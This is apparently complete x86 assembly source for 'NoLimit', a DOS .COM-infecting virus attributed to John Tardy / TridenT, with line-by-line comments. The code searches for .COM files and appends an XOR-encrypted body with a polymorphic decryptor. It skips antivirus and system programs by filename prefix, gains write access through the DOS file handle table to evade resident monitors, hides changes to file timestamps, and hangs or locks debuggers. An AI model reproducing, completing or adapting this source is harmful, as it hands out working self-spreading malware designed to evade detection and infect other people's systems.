;
; NoLimit Virus by John Tardy / TridenT
;
; Limited version of Servant Virus

Version         Equ 1                           ; Initial release.

                Org 0h                          ; Creates a .BIN file.

; This piece of code is located at the begin of the file

Start:          Jmp MainVir                     ; Jump to the main virus.

                Db '*'                          ; Infection marker.

; This will be appended to the victim

MainVir:        Lea Si,Decr                     ; This is the decryptor, which
DecrOfs         Equ $-2                         ; is mutated from the main
                Mov Cx,DecrLen                  ; virus. It uses a simple xor
Decrypt:        Xor B [Si],0                    ; algorithm. It uses three
DecVal          Equ $-1                         ; different index regs, Si, Di
Incer:          Inc Si                          ; or Bx. The Xor OpCode can be
LoopType:       Loop Decrypt                    ; 80h or 82h and it's Loop or
MainLen         Equ $-Mainvir                   ; LoopNz.

; From here everything is encrypted

Decr:           Call On1                        ; Get Offset of the appended
On1:            Pop BP                          ; virus by pushing the call on
                Sub BP,On1                      ; the stack and retrieve the
                                                ; address.

                Mov W TrapIt[Bp],KillDebug      ; This routine restores the
                Lea Si,OrgPrg[Bp]               ; beginning of the original
TrapIt          Equ $-2                         ; file, except when run from
                Mov Di,100h                     ; a debugger. It will then
                Push Di                         ; put the routine at
                Push Ax                         ; KillDebug in place of that,
                Movsw                           ; this locking the system
                Movsw                           ; after infection and
                Lea Dx,OrgPrg[Bp]               ; confusing TBCLEAN.
                Mov W TrapIt[Bp],OrgPrg         ;

                Mov Ah,19h                      ; We don't want to infect
                Int 21h                         ; programs on floppy drive,
                Cmp Al,2                        ; we then go to NoHD.
                Jb NoHD                         ;

                Mov Ah,1ah                      ; Use a new DTA.
                Mov Dx,0fd00h                   ;
                Int 21h                         ;

                In Al,21h                       ; This makes DOS DEBUG to
                Or Al,2                         ; hang and thus making
                Out 21h,Al                      ; beginning virus-researchers
                Xor Al,2                        ; a hard time.
                Out 21h,Al                      ;

                Mov Ah,4eh                      ; Search a .COM file in the
Search:         Lea Dx,FileSpec[BP]             ; current directory.
                Xor Cx,Cx                       ;
                Int 21h                         ;

                Jnc  Found                      ; If found, goto found,
NoHD:           Jmp Ready                       ; else goto ready.

KillDebug:      Cli                             ; The routine that will be
                Jmp KillDebug                   ; activated by the antidebug
                                                ; part.

                Db '[NoLimit] John Tardy / Trident '

; Here follows a table of filenames to avoid with infecting.

Tabel           Db 'CA'                         ; Catcher (Gobbler).
                Db 'VA'                         ; Validate (McAfee).
                Db 'GU'                         ; Guard (Dr. Solomon).
                Db 'CO'                         ; Command.Com (Microsoft).
                Db '4D'                         ; 4Dos (JP Software).
                Db 'VS'                         ; VSafe (CPav).
                Db 'TB'                         ; TbDel (Esass).
TabLen          Equ $-Tabel


Found:          Mov Bx,[0fd1eh]                 ; This routine checks if
                Lea Si,Tabel[Bp]                ; the candidate file begins
                Mov Cx,TabLen/2                 ; with the chars in the table
ChkNam:         Lodsw                           ; above. If so, it goes to
                Cmp Ax,Bx                       ; SearchNext.
                Je SearchNext                   ;
                Loop ChkNam                     ;

                mov dx,0fd1eh                   ; Open the file with only
                Mov Ax,3d00h                    ; read access.
                Int 21h                         ;

                Xchg Ax,Bx                      ; Put Filehandle to BX.

                Mov Ah,45h                      ; Duplicate Filehandle and
                Int 21h                         ; use the new one (confuses
                Xchg Ax,Bx                      ; some resident monitoring
                                                ; software (TBFILE)).

                mov Ax,1220h                    ; This is a tricky routine
                push bx                         ; used to get the offset
                int 2fh                         ; to the File Handle Table,
                mov bl,es:[di]                  ; where we can change
                Mov Ax,1216h                    ; directly some things.
                int 2fh                         ;
                pop bx                          ;
                mov ds,es                       ;

                mov byte ptr [di+2],2           ; File now open with write
                                                ; access.

                mov al,b [di+4]                 ; Store old file attributes
                mov b [di+4],0                  ; and clear it.
                push ax                         ;

                push ds                         ; Store FHT on the stack.
                push di                         ;

                mov ds,cs                       ; Restore old Ds and Es
                mov es,cs                       ; (with .COM equal to Cs).

                Mov Ah,3fh                      ; Read the first 4 bytes
                Lea Dx,OrgPrg[BP]               ; to OrgPrg (Bp indexed
                Mov Cx,4                        ; (the call remember?)).
                Int 21h                         ;

                Mov Ax,OrgPrg[BP]               ; Check if it is a renamed
                Cmp Ax,'ZM'                     ; .EXE file. If so, goto
                Je ExeFile                      ; ExeFile.
                Cmp Ax,'MZ'                     ;
                Je ExeFile                      ;

                Cmp B OrgPrg[3][Bp],'*'         ; Check if already infected.

                Jne Infect                      ; If not so, goto Infect.

ExeFile:        Call Close                      ; Call file close routine.

SearchNext:     Mov Ah,4fh                      ; And search the next victim.
                Jmp Search                      ;

Infect:         Mov Ax,4202h                    ; Jump to EOF.
                Cwd                             ;
                Xor Cx,Cx                       ;
                Int 21h                         ;

                Sub Ax,3                        ; Calculate the Jump and the
                Mov CallPtr[BP+1],Ax            ; decryptor offset values.
                Add Ax,(Offset Decr+0ffh)       ;
                Mov DecrOfs[Bp],Ax              ;

                Call EncryptIt                  ; Call Encryption engine.

                Mov Ah,40h                      ; Write the decoder to the
                Lea Dx,MainVir[Bp]              ; end of the file.
                Mov Cx,MainLen                  ;
                Int 21h                         ;

                Mov Ah,40h                      ; And append the encrypted
                Lea Dx,EndOfVir[BP]             ; main virus body to it
                Mov Cx,DecrLen                  ; also.
                Int 21h                         ;

                Mov Ax,4200h                    ; Jump to the beginning of
                Cwd                             ; the file.
                Xor Cx,Cx                       ;
                Int 21h                         ;

                Mov Ah,40h                      ; And write the jump to the
                Lea Dx,CallPtr[BP]              ; over the first 4 bytes of
                Mov Cx,4                        ; the file.
                Int 21h                         ;

                Call Close                      ; Call close routine.

Ready:          Mov Ah,1ah                      ; Restore the DTA.
                Mov Dx,80h                      ;
                Int 21h                         ;

                Pop Ax                          ; Restore error register.

                Ret                             ; Return to host (at 100h).

Close:          Pop Si

                pop di                          ; Restore FHT offset again.
                pop ds                          ;

                or b [di+6],40h                 ; Do not change file date/time
                                                ; stamps.

                pop ax                          ; Restore file attributes.
                mov b [di+4],al                 ;

                Mov Ah,3eh                      ; Close file.
                Int 21h                         ;

                mov ds,cs                       ; Restore Ds segment.

                Push Si
                Ret

CallPtr         Db 0e9h,0,0                     ; Here the jump is generated.

FileSpec        Db '*.CoM',0                    ; FileSpec + Infection Marker.

OrgPrg:         Int 20h                         ; Original 4 bytes of the
                Nop                             ; host program.
                Nop                             ;

EncryptIt:      Xor Ax,Ax                       ; Get timer tick (seen as a
                Mov Ds,Ax                       ; random value).
                Mov Ah,B Ds:[046ch]             ;

                Mov Ds,Cs                       ; If Ah is zero, goto
                Cmp Ah,0                        ; EncryptIt
                Je EncryptIt                    ;

GenKey:         Mov B DecVal[Bp],Ah             ; Encrypt the virus body
                Lea Si,Decr[Bp]                 ; to the address just at the
                Lea Di,EndOfVir[Bp]             ; end of the virus.
                Mov Cx,DecrLen                  ;
Encrypt:        Lodsb                           ;
                Xor Al,Ah                       ;
                Stosb                           ;
                Loop Encrypt                    ;

                Xor B Decrypt[Bp],2             ; Make the Xor variable.

                Test Ah,4                       ; Make the Loop variable
                Jc NoGarble                     ; (xor works like a switch
                Xor B LoopType[Bp],2            ; for 80h/82h or 0e0h/0e2h).

                Xchg Ah,Al                      ; Read the different
                And Ax,0003h                    ; Si, Di, Bx instructions
                Mov Si,Ax                       ; from the table and store
                Add Si,PolyTable                ; them into the decrytor, thus
                Add Si,Bp                       ; making it recognizable only
                Lodsb                           ; at 4 bytes. (or nibble
                Mov B MainVir[Bp],Al            ; checking is usable).
                Add Si,3                        ;
                Lodsb                           ;
                Mov B Decrypt[Bp+1],Al          ;
                Add Si,3                        ;
                Lodsb                           ;
                Mov B Incer[Bp],Al              ;

NoGarble:       Ret                             ; Return to called

; Table with functions for polymorphing

PolyTable       Equ $
                Db 0beh,0bfh,0bbh,0beh          ; Mov Si,Di,Bx,Si
                Db 034h,035h,037h,034h          ; Xor Si,Di,Bx,Si
                Db 046h,047h,043h,046h          ; Inc Si,Di,Bx,Si

                DB Version                      ; Virus version number

DecrLen         Equ $-Decr

EndOfVir        Equ $
